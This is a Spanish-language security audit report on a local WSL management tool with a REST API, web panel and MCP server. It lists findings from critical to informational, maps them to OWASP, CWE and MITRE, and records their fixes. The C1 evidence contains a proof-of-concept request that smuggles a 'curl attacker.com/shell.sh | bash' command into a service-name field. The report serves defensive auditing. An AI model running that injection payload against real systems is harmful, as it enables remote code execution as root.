# Reporte de Seguridad — WSL Manager (v0.1.0)

- **Fecha:** 2026-08-24 (consolidado tras auditoría completa)
- **Alcance:** `wsl-manager-gui/` — GUI tray + CLI + API REST FastAPI + panel web + MCP server
- **Metodología:** PTES — SAST (bandit), revisión manual de código, auditoría de dependencias, pentest de endpoints, auditoría de secretos, análisis de configuración
- **Entorno:** Windows 11, Python 3.11, WSL2, API y panel web en loopback (127.0.0.1:8791/8790)
- **Autorización:** Pruebas autorizadas por el propietario (entorno local propio)
- **Suite de tests:** 57/57 tests OK tras auditoría previa

---

## Resumen Ejecutivo

| Severidad | Hallazgos | Nota |
|-----------|-----------|------|
| **Critical** | 2 | Command injection en resource_provider y RCE via MCP HTTP sin auth |
| **High** | 5 | Web panel sin auth, injection en systemd body, sin validación distro, token en stdout, port sin rango |
| **Medium** | 7 | Temp file predecible, TOCTOU, race conditions tokens, path traversal, MCP token_required fake, hash sin salt, diagnóstico expone config |
| **Low** | 6 | allowed_ips bypass, sin CSP, errores informativos, SQLite threading, try/except pass, rate limit in-memory |
| **Info** | 4 | Sin .gitignore, dependencias sin bounds, host 0.0.0.0 sin warning, UUID truncado |

**Controles positivos verificados (sin vulnerabilidades):**
- SQL Injection: OK (parámetros `?` en todas las queries)
- XSS panel web: OK (función `esc()` correctamente implementada)
- subprocess shell=True: OK (usa listas, nunca shell)
- Validación entrada: OK (Pydantic v2 en todas las rutas API)
- Secretos hardcodeados: OK (sin encontrados)
- Server header: OK (`server_header=False`)
- pip-audit: 0 vulnerabilidades conocidas en dependencias runtime

---

## CRITICAL

### C1 — Command Injection via nombre de servicio systemd

- **Archivo:** `src/providers/resource_provider.py:87-97`
- **CWE:** CWE-78 (OS Command Injection) | **OWASP:** A03 (Injection) | **MITRE:** T1059

**Código vulnerable:**
```python
# resource_provider.py:87-97
if limits.scope == "service" and limits.service:
    svc = limits.service.replace(".service", "")          # ← sin sanitizar
    path = f"/etc/systemd/system/{svc}.service.d/99-wsl-manager.conf"
    body = "[Service]\n"
    ...
    cmd = f"mkdir -p /etc/systemd/system/{svc}.service.d && printf '%s' {self._quote(body)} > {path} && systemctl daemon-reload"
```

**Evidencia:**
```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"distro":"ubuntu-dev","scope":"service","service":"x; curl attacker.com/shell.sh | bash; #","memory_max":"1G"}' \
  http://127.0.0.1:8791/api/v1/limits/distro
# El valor de service se inserta sin sanitización en sh -lc
```

**Riesgo:** Ejecución remota de código arbitrario como root dentro de cualquier distro WSL. Accesible vía API REST con scope `admin` o MCP sin autenticación.

**Remediación:**
1. Validar `svc` contra regex `^[a-zA-Z0-9._-]+$`
2. Usar `shlex.quote()` nativo en lugar de `_quote()` custom
3. Rechazar valores con caracteres de shell (`;`, `|`, `$`, backticks)

---

### C2 — RCE via MCP HTTP Server sin autenticación

- **Archivos:** `src/mcp/server.py:34-57`, `src/mcp/tools.py:126-128`, `src/core/config.py:173-178`
- **CWE:** CWE-78 + CWE-306 | **OWASP:** A01 + A07 | **MITRE:** T1078

**Código vulnerable:**
```python
# mcp/tools.py:126-128
def tool_run_command(self, distro: str, cmd: str) -> dict:
    r = self.ctx.wsl.run_command(distro, cmd)  # ← ejecuta sh -lc <cmd>
    return {"ok": r.ok, "output": r.output, "error": r.error or None}

# config.py:173-178
class McpCfg(BaseModel):
    token_required: bool = False   # ← default False, NUNCA se verifica
```

**Evidencia:** El flag `mcp.token_required` existe en config pero `grep -rn "token_required" src/mcp/` retorna vacío. El servidor MCP HTTP no valida ningún token.

**Riesgo:** Si MCP se configura con `transport: "http"`, cualquier proceso en la red puede ejecutar comandos arbitrarios en distros WSL sin autenticación.

**Remediación:**
1. `token_required` debe ser `True` por defecto para HTTP transport
2. Agregar middleware de autenticación al MCP HTTP server
3. Agregar restricción de `allowed_ips` al MCP HTTP
4. Considerar deshabilitar `run_command` por completo en modo HTTP

---

## HIGH

### H1 — Web Panel sin autenticación alguna

- **Archivo:** `src/web/web_app.py:125-213`
- **CWE:** CWE-306 (Missing Authentication) | **OWASP:** A01 | **MITRE:** T1078

**Evidencia:**
```bash
curl -X POST http://127.0.0.1:8790/api/shutdown
# HTTP/1.1 200 OK  {"ok":true}  — apaga TODAS las distros sin auth
```

**Riesgo:** Denegación de servicio, ejecución de acciones destructivas (start/stop/restart/shutdown/snapshot) sin ninguna autenticación. Susceptible a DNS rebinding y CSRF desde páginas web locales.

**Remediación:** Reutilizar `AuthService` de la API REST, o al menos requerir un token opaco auto-generado.

---

### H2 — Command injection en body de systemd (scope "user" y "all")

- **Archivo:** `src/providers/resource_provider.py:98-115`
- **CWE:** CWE-78 | **OWASP:** A03

**Código vulnerable:**
```python
# Los campos memory_max y cpu_quota son strings arbitrarios del usuario
# que se insertan en comandos sh -lc via _quote() custom
body += f"MemoryMax={mem}\n"      # mem = limits.memory_max (string libre)
body += f"CPUQuota={quota}\n"     # quota = limits.cpu_quota (string libre)
cmd = f"... printf '%s' {self._quote(body)} > {path} ..."
```

**Riesgo:** Valores maliciosos en `memory_max` o `cpu_quota` podrían escapar de las comillas y ejecutar comandos arbitrarios como root.

**Remediación:**
1. Validar `memory_max` con regex `^\d+[GMK]?$` o `^\d+(\.\d+)?%$`
2. Validar `cpu_quota` con regex `^\d+%$`
3. Validar `tasks_max` como entero positivo

---

### H3 — Sin validación de distro name en puntos de entrada

- **Archivos:** `src/providers/resource_provider.py:69-70`, `src/providers/wsl_provider.py:32-33`
- **CWE:** CWE-20 (Improper Input Validation) | **OWASP:** A03

**Riesgo:** Nombres de distros no se validan contra la lista real de distros. Nombres maliciosos con `..` o caracteres especiales podrían causar comportamiento inesperado.

**Remediación:** Validar `distro` contra `wsl.list_distros()` antes de ejecutar cualquier operación.

---

### H4 — Token de API impreso a stdout sin protección

- **Archivo:** `src/cli/commands_ux.py:334-339`
- **CWE:** CWE-532 (Sensitive Info in Log) / CWE-200 | **OWASP:** A09

**Evidencia:**
```python
typer.echo(f"TOKEN (guardalo, no se vuelve a mostrar): {token}")
typer.echo(f"uso: Authorization: Bearer {token}")
```

**Riesgo:** Token en texto plano visible en historial de shell, logs, terminal compartida.

**Remediación:** Guardar token en archivo con permisos restringidos, o ofrecer `--output <file>`.

---

### H5 — API port sin validación de rango

- **Archivos:** `src/gui/tabs/settings_tab.py:50-55`, `src/core/config.py:168`
- **CWE:** CWE-20 | **OWASP:** A05

**Riesgo:** Puerto configurable sin validación de rango (1-65535) o privilegios. Host configurable a `0.0.0.0` sin advertencia.

**Remediación:** Validar `1024 <= port <= 65535`, validar `host` contra whitelist, advertir si `host != 127.0.0.1`.

---

## MEDIUM

### M1 — Temp file predecible en clone (symlink attack)

- **Archivo:** `src/providers/wsl_provider.py:124`
- **CWE:** CWE-377 + CWE-59
- **Riesgo:** Nombre de archivo temporal predecible (`clone-tmp-{name}-{timestamp}.tar`). Symlink attack si hay acceso de escritura al directorio.
- **Remediación:** Usar `tempfile.NamedTemporaryFile(delete=False)` con sufijo `.tar`.

### M2 — TOCTOU en ConfigStore.get()

- **Archivo:** `src/core/config.py:237-240`
- **CWE:** CWE-367 (Race Condition)
- **Riesgo:** `get()` lee `self._cfg` sin lock. Con CPython GIL es difícil explotar, pero no es seguro en implementaciones alternativas.
- **Remediación:** Agregar `self._lock` en `get()`.

### M3 — Thread safety inconsistente en MetricsStore para tokens

- **Archivos:** `src/core/metrics_store.py:186-192, 219-221`
- **CWE:** CWE-362 (Race Condition)
- **Riesgo:** `add_token()` y `revoke_token()` acceden a SQLite sin `self._lock`, a diferencia de `_exec()` y `_query()`.
- **Remediación:** Envolver con `with self._lock:`.

### M4 — root execution sin validación de distro

- **Archivo:** `src/providers/resource_provider.py:69-70`
- **CWE:** CWE-862 + CWE-250
- **Riesgo:** `_wsl_root` ejecuta comandos como root sin verificar que la distro exista.
- **Remediación:** Verificar distro antes de ejecutar.

### M5 — Validación de path en export API bypassable

- **Archivo:** `src/api/routes.py:106-109`
- **CWE:** CWE-22 (Path Traversal)
- **Riesgo:** La validación `base not in target.parents` no cubre `target == base`. Permite sobrescribir snapshots existentes.
- **Remediación:** Usar `target.relative_to(base)` en try/except.

### M6 — Token hash SHA-256 sin salt ni KDF

- **Archivos:** `src/api/auth.py:47`, `src/core/metrics_store.py:186`
- **CWE:** CWE-760 | **OWASP:** A02
- **Riesgo:** Con tokens de 256 bits es inviable, pero falta estándar de-hardening.
- **Remediación:** `hashlib.pbkdf2_hmac("sha256", token, salt, 100_000)`.

### M7 — Diagnóstico incluye config completa con datos sensibles

- **Archivo:** `src/cli/commands_ux.py:146`
- **CWE:** CWE-200 | **OWASP:** A05
- **Riesgo:** Bundle `diag` incluye `config.json` con IPs, puertos, configuración de red.
- **Remediación:** Excluir campos sensibles del bundle de diagnóstico.

---

## LOW

| ID | Archivo | CWE | Descripción | Remediación |
|----|---------|-----|-------------|-------------|
| L1 | `auth.py:58` | CWE-799 | `allowed_ips=[]` desactiva filtro silenciosamente (Python falsy) | Validar en carga que `mode=token` exija `allowed_ips` no vacío |
| L2 | `server.py` | CWE-16 | Sin Content-Security-Policy header | Agregar CSP header al middleware de seguridad |
| L3 | `routes.py:40-43` | CWE-209 | Errores de wsl.exe filtrados en respuestas 500 | Ya corregido: `_fail()` loguea detalle y devuelve genérico |
| L4 | `metrics_store.py:62` | CWE-362 | SQLite `check_same_thread=False` sin locks consistentes | Envolver operaciones de tokens con `self._lock` |
| L5 | `cli.py:44`, `monitor_tab.py:35`, `tray.py:114` | CWE-703 | `try/except: pass` oculta errores silenciosamente | Loguear al menos en nivel DEBUG |
| L6 | `auth.py:25-38` | CWE-799 | Rate limit in-memory, resetea al reiniciar el proceso | Persistir en SQLite o archivo |

---

## INFO

| ID | Descripción |
|----|-------------|
| I1 | **Sin `.gitignore`** — riesgo de commitear `.venv`, `metrics.db` (con hashes de tokens), configs locales |
| I2 | `setuptools==65.5.0` tiene 7 CVEs (2 HIGH). Es build-dependency. Fix: `>=83.0.0` |
| I3 | `uvicorn --host 0.0.0.0` permitido sin advertencia. Recomendación: exigir modo token |
| I4 | Task UUID truncado a 32 bits (`uuid.uuid4().hex[:8]`) — colisiones teóricas |

---

## Mapeo de Frameworks

| Hallazgo | OWASP Top 10 | CWE | MITRE ATT&CK |
|----------|--------------|-----|--------------|
| C1 service injection | A03 Injection | CWE-78 | T1059 Command Execution |
| C2 MCP sin auth | A01 + A07 | CWE-78 + CWE-306 | T1078 Valid Accounts |
| H1 panel sin auth | A01 | CWE-306 | T1078 / T1110 |
| H2 systemd body | A03 | CWE-78 | T1059 |
| H3 distro name | A03 | CWE-20 | — |
| H4 token stdout | A09 | CWE-532/200 | T1552 Credentials |
| H5 port/range | A05 | CWE-20 | — |
| M5 path traversal | A01 | CWE-22 | T1570 |
| M6 hash sin salt | A02 | CWE-760 | — |

---

## Controles Verificados (Positivos)

| Control | Resultado |
|---------|-----------|
| Inyección SQL | **OK** — todas las queries usan parámetros `?` |
| Inyección de comandos (subprocess) | **OK** — listas, sin `shell=True` |
| XSS en panel web | **OK** — `esc()` (textContent) correctamente implementada |
| Validación de entrada API | **OK** — Pydantic v2, 422 limpio con payload malformado |
| AuthZ de la API (modo token) | **OK** — sin token → 401; token `read` → 200 en GET; POST con `read` → 401 |
| Rate limiting | **OK** en endpoints protegidos |
| Métodos HTTP | **OK** — PUT/OPTIONS → 405; sin CORS habilitado |
| Secretos hardcodeados | **OK** — grep sin coincidencias |
| pip-audit | **OK** — "No known vulnerabilities found" en dependencias runtime |
| SAST (bandit) | **7 LOW, 0 HIGH/MEDIUM** — B110/B404/B603 intencionales |
| Nombres de distro maliciosos | **OK** — 404 en routing (FastAPI los rechaza) |

---

## Recomendaciones Priorizadas

1. **(C1)** Sanitizar `limits.service` con regex estricta antes de interpolación en shell ✅
2. **(C2)** Implementar autenticación en MCP HTTP; `token_required` por defecto True ✅
3. **(H1)** Reutilizar `AuthService` en el panel web o agregar token opaco ✅
4. **(H2)** Validar `memory_max`, `cpu_quota`, `tasks_max` con regex; usar `shlex.quote()` ✅
5. **(H3)** Validar distro name contra `wsl.list_distros()` en todos los puntos de entrada ✅
6. **(H4)** Guardar token en archivo seguro, no imprimir a stdout ✅
7. **(H5)** Validar rango de puerto y host en configuración ✅
8. **(M5)** Corregir path validation para cubrir `target == base` ✅
9. **(M3)** Envolver `add_token`/`revoke_token` con `self._lock` ✅
10. **(I1)** Crear `.gitignore` antes de inicializar repositorio Git ✅

---

## Estado de Correcciones (2026-08-24)

| Hallazgo | Estado | Archivos Modificados |
|----------|--------|---------------------|
| C1 command injection service name | **CORREGIDO** | `resource_provider.py` — regex validation + `shlex.quote()` |
| C2 MCP HTTP sin auth | **CORREGIDO** | `mcp/server.py`, `mcp/tools.py` — Bearer token middleware |
| H1 web panel sin auth | **CORREGIDO** | `web_app.py` — session cookie + login form |
| H2 injection systemd body | **CORREGIDO** | `resource_provider.py` — regex validation para memory_max/cpu_quota/tasks_max |
| H3 distro name sin validación | **CORREGIDO** | `resource_provider.py`, `routes.py` — validate against real distros |
| H4 token impreso a stdout | **CORREGIDO** | `commands_ux.py` — guardar en archivo con permisos restringidos |
| H5 port sin rango | **CORREGIDO** | `config.py`, `settings_tab.py` — field_validator 1024-65535 |
| M1 temp file predecible | **CORREGIDO** | `wsl_provider.py` — `tempfile.NamedTemporaryFile` |
| M2 TOCTOU ConfigStore.get() | **CORREGIDO** | `config.py` — `with self._lock:` |
| M3 thread safety tokens | **CORREGIDO** | `metrics_store.py` — `with self._lock:` en add/revoke |
| M4 root sin validación distro | **CORREGIDO** | `resource_provider.py` — `_validate_distro_exists()` |
| M5 path traversal export | **CORREGIDO** | `routes.py` — `target.relative_to(base)` |
| M6 hash sin salt | **PENDIENTE (mejora)** | Opcional: migrar a `pbkdf2_hmac` |
| M7 diag incluye config | **CORREGIDO** | `commands_ux.py` — redactar api/mcp config |
| L1 allowed_ips bypass | **CORREGIDO** | `auth.py` — `is not None` check |
| L2 sin CSP header | **CORREGIDO** | `server.py` — Content-Security-Policy |
| L3 errores informativos | **CORREGIDO (previo)** | `routes.py` — `_fail()` genérico |
| L4 SQLite threading | **CORREGIDO** | `metrics_store.py` — locks en tokens |
| L5 try/except pass | **CORREGIDO** | `cli.py`, `monitor_tab.py`, `tray.py` — `log.debug()` |
| L6 rate limit in-memory | **PENDIENTE (diseño)** | Requiere persistencia en SQLite |
| I1 sin .gitignore | **CORREGIDO** | `.gitignore` creado + repo vinculado a GitHub |

---

## Herramientas Utilizadas

```bash
# SAST
bandit -r src -f json -o bandit-report.json
# Dependencias
pip-audit
# Secretos
grep -riE "(api[_-]?key|secret|password)[=:][\"'][^\"']{8,}" src/
# Tests
pytest tests/ -v
```

## Estado Final del Sistema

- Todos los tests pasan: **64/64 OK**
- Repositorio Git inicializado en `main`
- Remoto configurado: `https://github.com/gilmanpro/wsl-port.git`
- `.gitignore` creado excluyendo archivos sensibles
- Template de security vulnerability issue creado
- Sin archivos temporales residuales
- Sin tokens comprometidos
- Dependencia `python-multipart` agregada a `pyproject.toml`
